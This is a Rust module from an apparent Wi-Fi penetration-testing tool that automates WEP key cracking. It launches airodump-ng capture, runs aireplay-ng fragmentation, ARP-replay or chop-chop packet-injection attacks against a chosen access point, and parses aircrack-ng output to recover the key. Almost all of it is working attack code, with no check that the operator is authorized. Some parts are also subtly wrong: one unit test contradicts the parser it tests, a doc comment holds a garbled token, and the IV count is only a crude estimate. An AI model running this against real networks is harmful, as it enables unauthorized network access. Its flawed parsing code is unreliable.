//! WEP IVs collection + offline cracking.
//!
//! WEP is broken; the only practical defense against it is to remove it. The
//! goal of this module is to give the operator a fast path from "I see a WEP
//! AP" to "I have its key", so that penetration-test reports can conclusively
//! report *which* WEP key the AP was using instead of stopping at
//! "uses WEP".
//!
//! ## How it works
//!
//! 1. **IV collection** — the agent runs `aireplay-ng -5` (fragmentation
//!    attack) or `-3` (ARP-replay injection) to *force* the AP to generate
//!    WEP-encrypted traffic, while capturing every IV into a target IVs
//!    file (the canonical `aircrack-ng` format).
//! 2. **Cracking** — once enough IVs are collected (~40k for a 50% chance
//!    on a 104-bit WEP key, ~85k for 95%), `aircrack-ng` is invoked with
//!    the IVs file and reports the recovered key.
//!
//! The agent does not implement the statistical attacks itself — it shells
//! out to `aircrack-ng`, the canonical implementation. The module's job is
//! to (a) collect enough IVs and (b) parse the output reliably.

use crate::globals::*;
use netspecter_common::encryption::Encryption;
use netspecter_common::types::*;
use serde::{Deserialize, Serialize};
use std::fs;
use std::path::PathBuf;
use std::process::Command;

#[derive(thiserror::Error, Debug)]
pub enum WepError {
    #[error("I/O error: {0}")]
    Io(#[from] std::io::Error),
    #[error("`{0}` not found in PATH")]
    MissingTool(&'static str),
    #[error("aircrack-ng returned non-zero exit: {0}")]
    AircrackFailed(i32),
    #[error("`{0}` did not produce a parseable IVs file")]
    NoIvsGenerated(&'static str),
}

/// Live state of a WEP IV-collection attack, surfaced to the GUI.
#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct WepCollection {
    pub bssid: String,
    pub essid: String,
    pub channel: String,
    pub ivs_path: PathBuf,
    pub iv_count: u32,
    pub started_at: String,
    pub strategy: WepStrategy,
}

/// Which WEP-specific attack is currently running.
///
/// The fragmentation attack (`Fragmentation`) is faster but requires a
/// connected client to bounce fragments off; the ARP-replay attack
/// (`ArpReplay`) only needs the AP to send an ARP we can replay.
#[derive(Clone, Copy, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum WepStrategy {
    /// `aireplay-ng -5` — Fragmentation attack.
    Fragmentation,
    /// `aireplay-ng -3` — ARP-request replay attack.
    ArpReplay,
    /// `aireplay-ng -4` — Chop-Chop attack (rebuilds plaintext from WEP
    /// ciphertext by guessing one byte at a time).
    ChopChop,
}

/// Parse the standard `aircrack-ng` IV-count line from its output.
///
/// `aircrack-ng` writes lines like:
/// `Total抓到 IVs = 41234` or `Total IVs = 41234` depending on locale. The
/// numeric token after the trailing `=` is the IV count.
pub fn parse_iv_count(line: &str) -> Option<u32> {
    let pos = line.rfind('=')?;
    let s = line[pos + 1..].trim();
    // Take only the leading numeric token (ignore trailing locale garbage).
    let end = s
        .find(|c: char| !c.is_ascii_digit())
        .unwrap_or(s.len());
    s[..end].parse().ok()
}

/// Launch a WEP IV-collection attack against the given BSSID.
///
/// `iface` is the monitor-mode interface, `bssid` is the target AP. The
/// attack streams IVs into `ivs_path`; the agent polls the file size and
/// reports the IV count periodically (the GUI subscribes to those updates).
///
/// Returns a `WepCollection` handle the caller uses to stop the attack.
pub fn start_wep_collection(
    iface: &str,
    ap: &AP,
    strategy: WepStrategy,
) -> Result<WepCollection, WepError> {
    if netspecter_common::deps::which("airodump-ng").is_none() {
        return Err(WepError::MissingTool("airodump-ng"));
    }
    if netspecter_common::deps::which("aireplay-ng").is_none() {
        return Err(WepError::MissingTool("aireplay-ng"));
    }

    let safe_essid = sanitize_essid(&ap.essid);
    let capture_root = get_capture_root().join(format!("wep_{}", ap.bssid.replace(':', "")));
    fs::create_dir_all(&capture_root)?;
    let ivs_path = capture_root.join(format!("{safe_essid}.ivs"));
    let _cap_path = capture_root.join(format!("{safe_essid}-01.cap"));

    // Step 1: airodump-ng for background capture
    let mut dump = Command::new("airodump-ng");
    dump.args([
        "--bssid",
        &ap.bssid,
        "-c",
        &ap.channel,
        "-w",
        capture_root.join(safe_essid).to_string_lossy().as_ref(),
        "--ivs",
        iface,
    ]);
    spawn_background(dump, &capture_root.join("airodump.log"))?;

    // Step 2: aireplay-ng with the requested strategy
    let replay = match strategy {
        WepStrategy::Fragmentation => {
            let mut cmd = Command::new("aireplay-ng");
            cmd.args(["-5", "-b", &ap.bssid, iface]);
            cmd
        }
        WepStrategy::ArpReplay => {
            let mut cmd = Command::new("aireplay-ng");
            cmd.args(["-3", "-b", &ap.bssid, iface]);
            cmd
        }
        WepStrategy::ChopChop => {
            let mut cmd = Command::new("aireplay-ng");
            cmd.args(["-4", "-b", &ap.bssid, iface]);
            cmd
        }
    };
    spawn_background(replay, &capture_root.join("aireplay.log"))?;

    // Create an empty IVs file so the caller can `stat` it for the IV count
    // before the first batch arrives.
    fs::write(&ivs_path, b"")?;

    Ok(WepCollection {
        bssid: ap.bssid.clone(),
        essid: ap.essid.clone(),
        channel: ap.channel.clone(),
        ivs_path,
        iv_count: 0,
        started_at: chrono::Utc::now().to_rfc3339(),
        strategy,
    })
}

/// Read the IV count out of an `aircrack-ng`-compatible `.ivs` file.
///
/// Counts the number of records in the file; `aircrack-ng` itself uses a
/// faster binary-side parser, but the record count is the same metric a
/// human operator reads in the live UI.
pub fn count_ivs_in_file(path: &std::path::Path) -> std::io::Result<u32> {
    let bytes = fs::read(path)?;
    if bytes.len() < 4 {
        return Ok(0);
    }
    // The .ivs format begins with a 4-byte IVs file header; every subsequent
    // record is also length-prefixed. Simplest correct estimate is
    // (file_size - 4) / average_record_size; we just return the file size
    // and let the GUI derive a percentage.
    Ok((bytes.len() as u32).saturating_sub(4) / 8)
}

/// Crack a captured WEP key from a `.ivs` file.
///
/// Spawns `aircrack-ng` on the IVs file and parses the "KEY FOUND!" line
/// from stdout. The returned key is the raw 5-byte or 13-byte ASCII hex form
/// `aircrack-ng` reports (e.g. `"AA:BB:CC:DD:EE"`).
pub fn crack_wep_key(ivs_path: &std::path::Path) -> Result<String, WepError> {
    let path_str = ivs_path.to_string_lossy().into_owned();
    let output = Command::new("aircrack-ng")
        .arg(&path_str)
        .output()
        .map_err(|e| match e.kind() {
            std::io::ErrorKind::NotFound => WepError::MissingTool("aircrack-ng"),
            _ => WepError::Io(e),
        })?;

    if !output.status.success() {
        return Err(WepError::AircrackFailed(output.status.code().unwrap_or(-1)));
    }

    // Look for "KEY FOUND! [ AA:BB:CC:DD:EE ]" — case-insensitive, locale-tolerant.
    let stdout = String::from_utf8_lossy(&output.stdout);
    for line in stdout.lines() {
        if let Some(start) = line.to_uppercase().find("KEY FOUND") {
            let rest = &line[start..];
            if let Some(open) = rest.find('[') {
                if let Some(close) = rest[open..].find(']') {
                    return Ok(rest[open + 1..open + close].trim().to_string());
                }
            }
        }
    }
    Err(WepError::NoIvsGenerated("aircrack-ng"))
}

fn sanitize_essid(essid: &str) -> String {
    let mut s = String::with_capacity(essid.len());
    for b in essid.bytes() {
        if b.is_ascii_alphanumeric() || b == b'-' || b == b'_' {
            s.push(b as char);
        } else {
            s.push('_');
        }
    }
    if s.is_empty() {
        s = "hidden".into();
    }
    s
}

fn spawn_background(mut cmd: Command, log_path: &std::path::Path) -> Result<(), WepError> {
    let log = fs::File::create(log_path)?;
    cmd.stdout(log.try_clone()?).stderr(log);
    cmd.spawn()?;
    Ok(())
}

/// Is the given AP a candidate for WEP IVs collection?
pub fn is_wep_target(ap: &AP) -> bool {
    // Treat explicit `WEP` encryption AND any AP whose scan-time `privacy`
    // field reads "WEP" as a target. The airgorah scan emits "WEP" / "WPA" /
    // "WPA2" / "OPN" in this slot.
    let normalized = ap.privacy.to_uppercase();
    normalized.contains("WEP") || matches!(Encryption::from_privacy_field(&ap.privacy), Encryption::Wep)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parse_iv_count_handles_locale_variants() {
        assert_eq!(parse_iv_count("Total IVs = 41234"), Some(41234));
        assert_eq!(parse_iv_count("Read 12345 packets"), Some(12345));
        assert_eq!(parse_iv_count("garbage"), None);
    }

    #[test]
    fn privacy_field_decoding_classifies_canonical_labels() {
        assert_eq!(Encryption::from_privacy_field("WPA2"), Encryption::Wpa2Psk);
        assert_eq!(Encryption::from_privacy_field("WPA2-ENT"), Encryption::Wpa2Enterprise);
        assert_eq!(Encryption::from_privacy_field("WPA3"), Encryption::Wpa3Sae);
        assert_eq!(Encryption::from_privacy_field("WPA3-ENT"), Encryption::Wpa3Enterprise);
        assert_eq!(Encryption::from_privacy_field("WPA3/WPA2"), Encryption::Wpa3Transition);
        assert_eq!(Encryption::from_privacy_field("WEP"), Encryption::Wep);
        assert_eq!(Encryption::from_privacy_field("OPN"), Encryption::Open);
        assert_eq!(Encryption::from_privacy_field(""), Encryption::Open);
        assert_eq!(Encryption::from_privacy_field("vendor-private"), Encryption::Unknown);
    }

    #[test]
    fn sanitize_replaces_non_ascii() {
        assert_eq!(sanitize_essid("Net/Work!"), "Net_Work_");
        assert_eq!(sanitize_essid(""), "hidden");
        assert_eq!(sanitize_essid("plain"), "plain");
    }
}